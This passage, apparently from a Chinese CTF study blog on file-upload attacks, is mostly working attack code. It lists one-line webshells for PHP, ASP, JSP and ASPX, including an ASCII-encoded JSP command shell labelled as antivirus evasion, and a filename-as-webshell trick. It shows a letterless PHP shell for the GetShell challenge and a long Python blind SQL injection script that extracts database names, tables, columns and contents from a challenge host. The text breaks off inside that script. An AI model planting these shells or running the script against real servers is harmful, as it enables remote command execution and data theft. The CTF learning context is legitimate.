<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = [].<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="number">1</span>]; <span class="comment">// r</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$_</span>[<span class="number">0</span>];	<span class="comment">// A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++; <span class="comment">// C</span></span><br><span class="line"><span class="variable">$_0</span> = <span class="variable">$_</span>; <span class="comment">// $_0 = C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++; <span class="comment">// G</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_0</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>(<span class="number">71</span>).<span class="variable">$__</span>(<span class="number">69</span>).<span class="variable">$__</span>(<span class="number">84</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"><span class="comment">// $$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br></pre></td></tr></table></figure>
<h3 id="通过文件名传马"><a href="#通过文件名传马" class="headerlink" title="通过文件名传马"></a>通过文件名传马</h3><p>这个算是个特殊情况，也就是直接将你的文件名直接输出在页面上，这个时候你可以直接将文件名改成一句话木马，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span>.phtml</span><br><span class="line"><span class="meta">&lt;?=</span>@<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span>.php</span><br></pre></td></tr></table></figure>
<p>这样当他输出文件名的时候就直接当js代码嵌入进网页了，然后可以直接GET传参</p>
<h3 id="常用一句话木马"><a href="#常用一句话木马" class="headerlink" title="常用一句话木马"></a>常用一句话木马</h3><p>简一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>绕过<code>&lt;?</code>限制的一句话木马</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = <span class="string">&#x27;php&#x27;</span>&gt;@<span class="built_in">eval</span>($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>asp一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
<p>JSP一句话木马</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">&quot;f&quot;</span>)!=<span class="literal">null</span>)(newjava.io.FileOutputStream (application.getRealPath(<span class="string">&quot;\\&quot;</span>)+request.getParameter(<span class="string">&quot;f&quot;</span>))).write (request.getParameter(<span class="string">&quot;t&quot;</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
<p>JSP一句话免杀（ASCLL编码）</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Class.forName(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) rt.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="literal">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> e.getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>ASPX一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="攻防世界-easyupload"><a href="#攻防世界-easyupload" class="headerlink" title="攻防世界 easyupload"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> easyupload</h4><p>简简单单上传php用蚁剑连接即可</p>
<h4 id="UUCTF-2022-新生赛-ez-upload-NSSCTF"><a href="#UUCTF-2022-新生赛-ez-upload-NSSCTF" class="headerlink" title="UUCTF 2022 新生赛]ez_upload | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3094">UUCTF 2022 新生赛]ez_upload | NSSCTF</a></h4><p>这题后端代码校验，匹配第一个<code>.</code>知道末尾，用 <code>1.jpg.php</code>即可绕过</p>
<h4 id="BUUCTF在线评测-运用-htaccess"><a href="#BUUCTF在线评测-运用-htaccess" class="headerlink" title="BUUCTF在线评测 运用.htaccess"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]Upload again!">BUUCTF在线评测</a> 运用.htaccess</h4><p>上传.htaccess后再上传规定文件，再连蚁剑</p>
<h4 id="BUUCTF在线评测-GetShell"><a href="#BUUCTF在线评测-GetShell" class="headerlink" title="BUUCTF在线评测 GetShell"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF 2018]GetShell">BUUCTF在线评测</a> GetShell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不含字母和数字的文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=[];<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="variable">$___</span>(<span class="variable">$$____</span>[_]);</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-EasyWeb"><a href="#BUUCTF在线评测-EasyWeb" class="headerlink" title="BUUCTF在线评测 EasyWeb"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019 总决赛 Day2 Web1]Easyweb">BUUCTF在线评测</a> EasyWeb</h4><p>结合了SQL和文件上传，这里是个用文件名写马</p>
<p>SQL脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- 基础函数 --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_length</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select length(database()))=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    pool = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    length = database_length(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;DatabaseLength:&#x27;</span>, length)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> pool:</span><br><span class="line">            payload = <span class="string">f&quot;or ascii(substring(database(),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ch)&#125;</span>#&quot;</span></span><br><span class="line">            geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">                name += ch</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;DatabaseName:&#x27;</span>, name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- 表相关函数 --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_count</span>(<span class="params">url: <span class="built_in">str</span>, db_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select count(table_name) from information_schema.tables where table_schema=<span class="subst">&#123;db_hex&#125;</span>)=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_length</span>(<span class="params">url: <span class="built_in">str</span>, idx: <span class="built_in">int</span>, db_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select length(table_name) from information_schema.tables where table_schema=<span class="subst">&#123;db_hex&#125;</span> limit <span class="subst">&#123;idx&#125;</span>,1)=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>(<span class="params">url: <span class="built_in">str</span>, db_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    pool = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line">    tables = []</span><br><span class="line">    count  = table_count(url, db_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;TableCount:&#x27;</span>, count)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        tbl = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        length = table_length(url, idx, db_hex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;TableLength:&#x27;</span>, length)</span><br><span class="line">        <span class="keyword">if</span> length <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> ch <span class="keyword">in</span> pool:</span><br><span class="line">                payload = <span class="string">f&quot;or ascii(substring((select table_name from information_schema.tables where table_schema=<span class="subst">&#123;db_hex&#125;</span> limit <span class="subst">&#123;idx&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ch)&#125;</span>#&quot;</span></span><br><span class="line">                geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">                    tbl += ch</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;TableName<span class="subst">&#123;idx+<span class="number">1</span>&#125;</span>: <span class="subst">&#123;tbl&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        tables.append(tbl)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- 列相关函数 --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_count</span>(<span class="params">url: <span class="built_in">str</span>, table_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select count(column_name) from information_schema.columns where table_name=<span class="subst">&#123;table_hex&#125;</span>)=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_length</span>(<span class="params">url: <span class="built_in">str</span>, idx: <span class="built_in">int</span>, table_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select length(column_name) from information_schema.columns where table_name=<span class="subst">&#123;table_hex&#125;</span> limit <span class="subst">&#123;idx&#125;</span>,1)=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">url: <span class="built_in">str</span>, table_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    pool = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line">    columns = []</span><br><span class="line">    count = column_count(url, table_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ColumnCount:&#x27;</span>, count)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        col = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        length = column_length(url, idx, table_hex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ColumnLength:&#x27;</span>, length)</span><br><span class="line">        <span class="keyword">if</span> length <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> ch <span class="keyword">in</span> pool:</span><br><span class="line">                payload = <span class="string">f&quot;or ascii(substring((select column_name from information_schema.columns where table_name=<span class="subst">&#123;table_hex&#125;</span> limit <span class="subst">&#123;idx&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ch)&#125;</span>#&quot;</span></span><br><span class="line">                geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">                    col += ch</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;ColumnName<span class="subst">&#123;idx+<span class="number">1</span>&#125;</span>: <span class="subst">&#123;col&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        columns.append(col)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- 数据提取函数 --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">content_length</span>(<span class="params">url: <span class="built_in">str</span>, table: <span class="built_in">str</span>, cols: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    col_concat = <span class="string">&#x27;,&#x27;</span>.join(cols)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        payload = <span class="string">f&quot;or (select length(group_concat(<span class="subst">&#123;col_concat&#125;</span>)) from <span class="subst">&#123;table&#125;</span>)=<span class="subst">&#123;i&#125;</span>#&quot;</span></span><br><span class="line">        geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">all_content</span>(<span class="params">url: <span class="built_in">str</span>, table: <span class="built_in">str</span>, cols: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    pool = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,|@_.-&#123;&#125;&#x27;</span></span><br><span class="line">    col_concat = <span class="string">&#x27;,&#x27;</span>.join(cols)</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    length = content_length(url, table, cols)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;AllContentLength:&#x27;</span>, length)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> pool:</span><br><span class="line">            payload = <span class="string">f&quot;or ascii(substring((select group_concat(<span class="subst">&#123;col_concat&#125;</span>) from <span class="subst">&#123;table&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ch)&#125;</span>#&quot;</span></span><br><span class="line">            geturl  = url + urllib.parse.urlencode(&#123;<span class="string">&#x27;path&#x27;</span>: payload&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> requests.get(geturl).content:</span><br><span class="line">                content += ch</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Content in <span class="subst">&#123;table&#125;</span>: <span class="subst">&#123;content&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- 主流程 --------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://c18868fe-0e4a-432b-848c-cb5b83afe012.node5.buuoj.cn:81/image.php?id= \\0&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    db_name = database_name(url)</span><br><span class="line">    <span class="built_in">print</span>(<span 